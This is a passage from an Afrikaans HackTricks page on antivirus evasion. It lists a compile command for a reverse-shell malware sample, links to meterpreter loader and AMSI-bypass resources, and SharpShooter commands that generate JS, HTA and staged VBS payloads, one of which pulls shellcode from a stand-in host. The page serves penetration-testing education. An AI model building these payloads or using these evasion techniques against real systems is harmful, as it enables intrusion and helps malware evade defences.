i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir die bou van injectors voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)


{{#include ../banners/hacktricks-training.md}}
